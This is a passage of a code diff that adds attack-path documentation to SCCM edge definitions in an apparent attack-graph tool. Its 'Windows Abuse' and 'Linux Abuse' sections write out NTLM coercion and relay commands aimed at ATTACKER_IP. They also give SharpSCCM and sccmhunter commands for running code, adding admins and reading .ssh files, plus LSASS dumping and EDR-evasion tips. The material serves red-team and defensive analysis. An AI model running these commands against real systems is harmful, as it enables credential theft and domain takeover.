+            "content": "A Site Server can be coerced into authenticating to a site system that does not require SMB signing, allowing the coerced authentication to be relayed over SMB to gain local administrator access to that site system (site servers are local administrators on their site systems). This is a possible edge, emitted when the target's SMB signing is not required and its inbound NTLM restriction is unset or 'Off'. The source is the Authenticated Users principal of the site server's domain, and the target is the vulnerable site system computer. Signing is measured directly by negotiating an SMB2 session with the target (no credentials required); the NTLM-restriction state is read from the target's registry when RemoteRegistry access is available."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "Coerce and relay authentication over SMB:\n\n### Step 1: Set up an NTLM relay targeting the site system's SMB service\n\n```text\nntlmrelayx.py -t smb://<target_site_system> -smb2support\n```\n\n### Step 2: Trigger authentication from the Site Server using:\n\n- PrinterBug/SpoolSample\n\n```text\nSpoolSample.exe SITE_SERVER ATTACKER_IP\n```\n\n- PetitPotam\n\n```text\nPetitPotam.exe ATTACKER_IP SITE_SERVER\n```\n\n- Coercer\n\n```text\ncoercer.py coerce -u '' -p '' -t SITE_SERVER -l ATTACKER_IP\n```\n\n### Step 3: Because the target does not require SMB signing, the relay authenticates as\n\nthe site server (a local admin); add -c or -e to ntlmrelayx to run a command\n\nor dump SAM/secrets on the target.\n\nSee the Misconfiguration Manager TAKEOVER-2, TAKEOVER-6, and TAKEOVER-7 techniques in the References section."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "Coerce and relay authentication over SMB:\n\n### Step 1: Set up an NTLM relay targeting the site system's SMB service\n\n```text\nntlmrelayx.py -t smb://<target_site_system> -smb2support\n```\n\n### Step 2: Trigger authentication from the Site Server using:\n\n- PetitPotam (unauthenticated)\n\n```text\npython3 PetitPotam.py ATTACKER_IP SITE_SERVER\n```\n\n- Coercer\n\n```text\ncoercer.py coerce -u '' -p '' -t SITE_SERVER -l ATTACKER_IP\n```\n\n- PrinterBug via Wine\n\n```text\nwine SpoolSample.exe SITE_SERVER ATTACKER_IP\n```\n\n### Step 3: Because the target does not require SMB signing, the relay authenticates as\n\nthe site server (a local admin); add -c or -e to ntlmrelayx to run a command\n\nor dump SAM/secrets on the target.\n\nSee the Misconfiguration Manager TAKEOVER-2, TAKEOVER-6, and TAKEOVER-7 techniques in the References section."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Coercion methods may generate logon events on the target system (Event ID 4624/4625). SMB relay that executes commands or dumps secrets is more likely to be detected by EDR. This is a possible edge: it is emitted when the target's SMB signing is not required and its inbound NTLM restriction is unset or 'Off'. Requiring SMB signing on site systems prevents this attack."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-2/takeover-2_description.md](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-2/takeover-2_description.md)\n- [https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-6/takeover-6_description.md](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-6/takeover-6_description.md)\n- [https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-7/takeover-7_description.md](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-7/takeover-7_description.md)\n- [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)\n- [https://github.com/p0dalirius/Coercer](https://github.com/p0dalirius/Coercer)\n- [https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_LocalAdminRequired",
-      "description": "",
-      "is_traversable": true
+      "description": "The source site server is expected to have local administrator access to the destination site system based on SCCM’s deployment requirements.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "This indicates that the source computer (an SCCM site server) has local administrator rights on the target computer (another site system in the same site). SCCM site servers are configured as local administrators on the site systems they manage, and multiple site servers in the same site are mutually local administrators.\n\nOpenHound infers this edge from two computers tagged as site systems of the SAME site, joining the site-system role tags (built from RemoteRegistry SMS keys, the anonymous HTTP site-signing-certificate probe, and LDAP management-point capabilities) through the site hierarchy those same sources build -- it is not read from an actual local-group membership list. The role tags and hierarchy are directly observed, not guessed, so this edge is produced the same way at every collection privilege level. False positive: an administrator who removed the default local-administrators grant during a hardening pass, or a role tag attributed to the wrong site, will make this edge overstate real access -- confirm actual local-group membership on the target before relying on it."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "If you control the source site server, you already have local administrator access to the target site system. Move laterally to it with any administrative remote-access method (SMB/PsExec, WMI, WinRM, or remote service creation), then dump credentials or LSASS on the target to capture the identities of accounts with sessions there."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "From a Linux machine, use the source site server's credentials (or a coercion/relay primitive) with Impacket tools such as psexec.py, wmiexec.py, or smbexec.py to gain administrative command execution on the target site system, then dump credentials remotely with secretsdump.py."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Administrative lateral movement (PsExec-style service creation, WMI, WinRM) and credential dumping are commonly monitored by EDR. Prefer least-noisy techniques and be aware that LSASS access may be flagged. For more information, see the References tab."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/configs/site-and-site-system-prerequisites](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/configs/site-and-site-system-prerequisites)\n- [https://attack.mitre.org/techniques/T1021/](https://attack.mitre.org/techniques/T1021/)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_SameHostAs",
-      "description": "",
-      "is_traversable": true
+      "description": "The Active Directory computer and SCCM client device represent the same computer, matched using the computer’s Active Directory security identifier.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "This indicates that the source and target nodes represent the same physical host: an Active Directory computer object and its corresponding SCCM client device. SCCM identifies clients by a client GUID rather than a domain SID, so this edge correlates the two identities for the same machine.\n\nThe pairing is made by an exact FQDN/hostname match, using either an AdminService/WMI-enumerated client record (when that privilege is available) or, without it, a client device inferred solely from the CmRcService service-principal-name registered on the computer's AD object. When the client device on this edge is one of those possible (uncorroborated) devices, the pairing is itself only a possible one and is not produced when possible-edge collection is turned off. False positive: a stale DNS record, a decommissioned or renamed computer that kept its old SCCM client GUID, or a duplicate hostname elsewhere in the forest can pair this edge with the wrong AD computer."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "There is no specific abuse for this edge. It links a computer's Active Directory identity to its SCCM client identity so attack paths through one identity can be followed to the other (for example, from an SCCM client device to the AD computer that can be coerced or relayed, or vice versa)."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "There is no specific abuse for this edge. It links a computer's Active Directory identity to its SCCM client identity so attack paths through one identity can be followed to the other (for example, from an SCCM client device to the AD computer that can be coerced or relayed, or vice versa)."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "There are no OPSEC considerations related to this edge."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/clients/manage/client-installation-methods](https://learn.microsoft.com/en-us/intune/configmgr/core/clients/manage/client-installation-methods)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_AllPermissions",
-      "description": "",
-      "is_traversable": true
+      "description": "The administrative user holds Full Administrator and is assigned both All Systems and All Users and User Groups, indicating unrestricted administrative access across the hierarchy.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source SCCM administrative user has been granted the Full Administrator security role scoped to the \"All Systems\" and \"All Users and User Groups\" collections, giving it all permissions in SCCM and effective control of every site in the hierarchy and its managed client devices."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "To leverage these permissions from a Windows machine, execute `SharpSCCM.exe <command> <subcommand> -sms <sms_provider_ip> -sc <site_code>` or use the Microsoft Configuration Manager Console software in the context of this admin user to connect to an SMS Provider for any site in the hierarchy. As a Full Administrator, this user can perform any SCCM action across the hierarchy, including deploying applications, running scripts on client devices, and granting the same permissions to arbitrary users with the `New-CMAdministrativeUser` Configuration Manager PowerShell cmdlet."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "To leverage these permissions from a Linux machine, execute `python3 sccmhunter.py admin -u <username> -p <password> -ip <sms_provider_ip>` to connect to an SMS Provider for any site in the hierarchy. As a Full Administrator, this user can perform any SCCM action across the hierarchy, including granting the same permissions to arbitrary users with the SCCMHunter `add_admin <user_name> <domain_sid>` command."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "An EDR product may detect your attempt to run SharpSCCM and alert a SOC analyst. Proxying in SCCMHunter or the Configuration Manager Console software are less likely to be detected. Creation of new SCCM admin users is a detectable event and will be visible to legitimate SCCM admins in the console. Most actions in SCCM are logged to files in C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs are primarily for diagnostics/troubleshooting and it is uncommon for them to be forwarded to a SIEM. For more information, see the References tab."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration](https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration)\n- [https://learn.microsoft.com/en-us/powershell/module/configurationmanager/new-cmadministrativeuser](https://learn.microsoft.com/en-us/powershell/module/configurationmanager/new-cmadministrativeuser)\n- [https://github.com/Mayyhem/SharpSCCM/wiki](https://github.com/Mayyhem/SharpSCCM/wiki)\n- [https://github.com/garrettfoster13/sccmhunter/wiki/admin#add_admin](https://github.com/garrettfoster13/sccmhunter/wiki/admin#add_admin)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_ApplicationAdministrator",
-      "description": "",
-      "is_traversable": true
+      "description": "The administrative user holds all permissions granted to the Application Administrator security role over a collection containing this device, providing an execution path through application deployment.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source SCCM administrative user is assigned the Application Administrator security role and is assigned a collection containing the target client device, allowing the user to deploy an application to the device."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "To execute an application on an SCCM client device from Windows, host an executable on a file share or path that is accessible from the target client device, for example using the `python3 smbserver.py <name_for_share> <local_path_to_share>` Impacket script or a file share on a distribution point.\n\nNext, execute `SharpSCCM.exe get devices -n <client_device_name> -sms <sms_provider_ip> -sc <site_code>` in the context of an SCCM admin user to connect to an SMS Provider for any site in the hierarchy, search for a client device by name, and obtain its resource ID.\n\nThen, execute `SharpSCCM.exe exec -rid <resource_id> -p <unc_path_to_executable> -sms <sms_provider_ip> -sc <site_code>` to launch the application. In very large environments, it may be necessary to increase the wait time to ensure the application executes before automated cleanup using the `-w <seconds>` option.\n\nBy default, SharpSCCM will execute the application in the context of the user who is currently logged in to the client device, or the `-s` flag can be added to the command to execute the application as SYSTEM. If the UNC path of the application is set to an attacker-controlled IP address or NetBIOS name and port, that user will authenticate to the attacker server via NTLM, allowing the credentials to be cracked or relayed."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "There is no public Linux tooling to execute an application on an SCCM client device at the time of this writing. However, a SOCKS proxy can be used to follow the Windows Abuse noted above."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "An EDR product may detect your attempt to run SharpSCCM and alert a SOC analyst. Proxying in SCCMHunter or the Configuration Manager Console software are less likely to be detected. Most actions in SCCM are logged to files in C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs are primarily for diagnostics/troubleshooting and it is uncommon for them to be forwarded to a SIEM. For more information, see the References tab."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles](https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles)\n- [https://github.com/Mayyhem/SharpSCCM/wiki](https://github.com/Mayyhem/SharpSCCM/wiki)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_ApplicationAuthor",
-      "description": "",
-      "is_traversable": true
+      "description": "The administrative user holds all permissions granted to the Application Author security role over a collection containing this device. Execution requires an application the user can edit that is already deployed to the device.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source SCCM administrative user is assigned the Application Author security role and is assigned a collection containing the target client device, allowing the user to modify existing applications and packages. Application Authors can gain code execution by swapping a deployed application's installation path with an attacker-controlled path and updating its detection method or version number so it is redeployed to the device."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "There is no public offensive tooling to abuse this edge at the time of this writing. Use the Microsoft Configuration Manager Console software in the context of the admin user to connect to an SMS Provider for any site in the hierarchy."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Most actions in SCCM are logged to files in C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs are primarily for diagnostics/troubleshooting and it is uncommon for them to be forwarded to a SIEM."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles](https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_AssignAllPermissions",
-      "description": "",
-      "is_traversable": true
+      "description": "Control of the source SMS Provider computer or site database provides a route to granting unrestricted SCCM administrative access to the destination site.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source principal can grant all permissions in SCCM, allowing complete control of the hierarchy and its managed client devices.\n\nThis edge is built for two different structural reasons, not one template: a domain computer discovered hosting the SMS Provider role (confirmed from the RemoteRegistry SMS Provider key, an anonymous HTTP AdminService probe, or LDAP management-point capabilities) can grant all permissions in every primary site it reaches, and the SCCM site database itself can grant all permissions in its own site because the site's RBAC lives in that database's tables. The SMS Provider variant is measured directly from the observed role tag and site hierarchy, so it appears the same way at every collection privilege level. The site-database variant is only as strong as how that host was identified: solid when RemoteRegistry, AdminService, or WMI directly confirmed it is the site database; an assumption, tagged as such, when the host was instead inferred from an MSSQLSvc service principal name plus its co-location with other SCCM roles, with nothing confirming it is THIS site's database rather than an unrelated SQL Server."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "The abuse for this edge is dependent on the source principal type.\n\nSite database: This node represents an SCCM site database, which holds the site's RBAC. Anyone who can access the database (for example, running as `LocalSystem` on the database server, or after dumping the SQL service account's credentials and impersonating a database administrator to the MSSQL service) can grant an arbitrary user any security role and collection. Please refer to the Misconfiguration Manager TAKEOVER-2 technique in the References section for more information.\n\nSMS Provider: This computer hosts a WMI provider and the AdminService REST API that can be used to grant an arbitrary user any security role and collection. Please refer to the Misconfiguration Manager TAKEOVER-5 and TAKEOVER-6 techniques in the References section for more information."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "The abuse for this edge is dependent on the source principal type.\n\nSite database: This node represents an SCCM site database, which holds the site's RBAC. Anyone who can access the database (for example, running as `LocalSystem` on the database server, or after dumping the SQL service account's credentials and impersonating a database administrator to the MSSQL service) can grant an arbitrary user any security role and collection. Please refer to the Misconfiguration Manager TAKEOVER-2 technique in the References section for more information.\n\nSMS Provider: This computer hosts a WMI provider and the AdminService REST API that can be used to grant an arbitrary user any security role and collection. Please refer to the Misconfiguration Manager TAKEOVER-5 and TAKEOVER-6 techniques in the References section for more information."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Creation of new SCCM admin users is a detectable event and will be visible to legitimate SCCM admins in the console. It is also possible to access the site database and swap the SID of an existing user with an attacker-controlled SID. However, the legitimate user will lose access. The site-database variant of this edge may be wrong if the co-located SQL Server it was templated from later turns out not to be the site database; verify with a direct connection before acting on it."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/_takeover-techniques-list.md](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/_takeover-techniques-list.md)\n- [https://github.com/garrettfoster13/sccmhunter/wiki/admin#add_admin](https://github.com/garrettfoster13/sccmhunter/wiki/admin#add_admin)\n- [https://www.oscc.be/sccm/Defending-the-Castle/](https://www.oscc.be/sccm/Defending-the-Castle/)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_ComplianceSettingsManager",
-      "description": "",
-      "is_traversable": true
+      "description": "The administrative user holds all permissions granted to the Compliance Settings Manager security role over a collection containing this device, providing a code execution path through compliance scripts.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source SCCM administrative user is assigned the Compliance Settings Manager security role and is assigned a collection containing the target client device, allowing the user to create or modify configuration items or baselines and deploy them to the device."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "There is no public offensive tooling to abuse this edge at the time of this writing. Use the Microsoft Configuration Manager Console software in the context of the admin user to connect to an SMS Provider for any site in the hierarchy."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Most actions in SCCM are logged to files in C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs are primarily for diagnostics/troubleshooting and it is uncommon for them to be forwarded to a SIEM."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles](https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles)\n- [https://learn.microsoft.com/en-us/intune/configmgr/compliance/deploy-use/deploy-configuration-baselines](https://learn.microsoft.com/en-us/intune/configmgr/compliance/deploy-use/deploy-configuration-baselines)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_Contains",
-      "description": "",
-      "is_traversable": true
+      "description": "The site contains the destination administrative user, security role, or collection.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "This indicates that the SCCM site contains the target object (a collection, security role, or administrative user). In a single hierarchy these objects are shared across every non-secondary site, so each site contains every global object. This is a structural relationship used for organization and traversal."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "There is no specific abuse for this edge. It represents SCCM's containment structure and supports attack-path traversal to the contained collections, security roles, and administrative users."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "There is no specific abuse for this edge. It represents SCCM's containment structure and supports attack-path traversal to the contained collections, security roles, and administrative users."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "There are no OPSEC considerations related to this edge."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration](https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/design-a-hierarchy-of-sites](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/design-a-hierarchy-of-sites)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_FullAdministrator",
-      "description": "",
-      "is_traversable": true
+      "description": "The administrative user holds all permissions granted to the Full Administrator security role over a collection containing this device, allowing management actions that can execute code on the device.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source SCCM administrative user is assigned the Full Administrator security role and is assigned a collection containing the target client device, allowing the user to execute all SCCM actions against the device.\n\nControl of a client device via SCCM allows deployment of an application or package, PowerShell execution, authentication coercion, or read access to any data on the device.\n\nThe Full Administrator security role also allows assignment of any security role to new or existing administrative users, limited to the collections the source user is assigned."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "To leverage SCCM administrative user permissions from a Windows machine, execute `SharpSCCM.exe <command> <subcommand> -sms <sms_provider_ip> -sc <site_code>` or leverage the Microsoft Configuration Manager Console software in the context of the admin user to connect to an SMS Provider for any site in the hierarchy.\n\nTo execute an application on an SCCM client device from Windows, host an executable on a file share or path that is accessible from the target client device, for example using the `python3 smbserver.py <name_for_share> <local_path_to_share>` Impacket script or a file share on a distribution point.\n\nNext, execute `SharpSCCM.exe get devices -n <client_device_name> -sms <sms_provider_ip> -sc <site_code>` in the context of an SCCM admin user to connect to an SMS Provider for any site in the hierarchy, search for a client device by name, and obtain its resource ID.\n\nThen, execute `SharpSCCM.exe exec -rid <resource_id> -p <unc_path_to_executable> -sms <sms_provider_ip> -sc <site_code>` to launch the application. In very large environments, it may be necessary to increase the wait time to ensure the application executes before automated cleanup using the `-w <seconds>` option.\n\nBy default, SharpSCCM will execute the application in the context of the user who is currently logged in to the client device, or the `-s` flag can be added to the command to execute the application as SYSTEM. If the UNC path of the application is set to an attacker-controlled IP address or NetBIOS name and port, that user will authenticate to the attacker server via NTLM, allowing the credentials to be cracked or relayed.\n\nTo use CMPivot, which allows read access to client devices, including their file systems, registry, users and groups, and event logs, execute `SharpSCCM.exe invoke admin-service -q <kql_query> [-r <resource_id>|-i <collection_id>]`. For example, the KQL query `\"File('C:\\Users\\*\\.ssh\\*')\"` will list files discovered in any user's `.ssh` directory, after which the `\"FileContent('<path>')\"` KQL query can be used to read a file's contents.\n\nPlease refer to the References section for additional abuse primitives, tools, and resources."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "To execute PowerShell on an SCCM client device from Linux, execute `python3 sccmhunter.py admin -u <username> -p <password> -ip <sms_provider_ip>` to connect to an SMS Provider for any site in the hierarchy, then execute the `get_device <name>` or `get_puser <name>` command to identify the target client device's resource ID.\n\nNext, execute the `interact <resource_id>` command followed by `script <local_path_to_ps1>` to execute a PowerShell script on the client device.\n\nPlease refer to the References section for additional abuse primitives, tools, and resources."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "An EDR product may detect your attempt to run SharpSCCM and alert a SOC analyst. Proxying in SCCMHunter or the Configuration Manager Console software are less likely to be detected. Most actions in SCCM are logged to files in C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs are primarily for diagnostics/troubleshooting and it is uncommon for them to be forwarded to a SIEM. For more information, see the References tab."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles](https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles)\n- [https://github.com/Mayyhem/SharpSCCM/wiki](https://github.com/Mayyhem/SharpSCCM/wiki)\n- [https://github.com/garrettfoster13/sccmhunter/wiki](https://github.com/garrettfoster13/sccmhunter/wiki)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_HasADLastLogonUser",
-      "description": "",
-      "is_traversable": true
+      "description": "SCCM records the destination user as this device’s last Active Directory logon user. This historical association does not guarantee a current session.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The last time SCCM conducted Active Directory discovery (every 5 minutes by default), the target user was the last to log on to the source computer.\n\nWhen a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation/theft, or injecting into a user's process.\n\nAny user that is an administrator to the system has the capability to retrieve the credential material from memory if it still exists.\n\nNote: A session does not guarantee credential material is present, only possible."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "If the target user has a logon session on the source computer, you may be able to recover that user's credential material or impersonate their session from the computer. This requires that you can reach the computer, that you have administrative (or SYSTEM) rights on it, and that the user has an interactive (non-network) logon session there.\n\nGiven that access, a logged-on user's credentials can typically be obtained by dumping them from the memory of the Local Security Authority process (LSASS), by stealing or impersonating the user's access token to act as them against other systems, or by capturing what the user types or copies (for example, keylogging or clipboard capture). Whether any of these succeeds depends on the user's logon type, how recently they authenticated, and the host's protections (such as LSASS protection, Credential Guard, or an EDR product). See the References tab for current techniques and tooling.\n\nThis data reflects only what was true at the time of collection, so the user may have logged off by the time you reach the computer. Because people tend to reuse the same machines for their day-to-day work, it is often worth checking more than once for the session to return."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "An EDR product may detect your attempt to inject into lsass and alert a SOC analyst. There are many more opsec considerations to keep in mind when stealing credentials or tokens. For more information, see the References tab."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/servers/deploy/configure/about-discovery-methods#bkmk_aboutSystem](https://learn.microsoft.com/en-us/intune/configmgr/core/servers/deploy/configure/about-discovery-methods#bkmk_aboutSystem)\n- [https://attack.mitre.org/tactics/TA0006/](https://attack.mitre.org/tactics/TA0006/)\n- [https://attack.mitre.org/techniques/T1003/](https://attack.mitre.org/techniques/T1003/)\n- [https://attack.mitre.org/techniques/T1134/](https://attack.mitre.org/techniques/T1134/)\n- [https://attack.mitre.org/techniques/T1056/001/](https://attack.mitre.org/techniques/T1056/001/)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_HasClient",
-      "description": "",
-      "is_traversable": true
+      "description": "The site manages the destination client device.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "Control of a client device via SCCM may allow deployment of an application or package, PowerShell execution, authentication coercion, or read access to any data on the device.\n\nThis edge is itself evidence that SCCM manages the device: either an AdminService/WMI-confirmed client record, or, without that privilege, a device inferred solely from the CmRcService service-principal-name registered on the computer's AD object (a possible client device). False positive: CmRcService can remain registered on a computer that was decommissioned as an SCCM client without the SPN being cleaned up, so a possible client device is weaker evidence than a directly enumerated one, and it is not produced when possible-edge collection is turned off."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
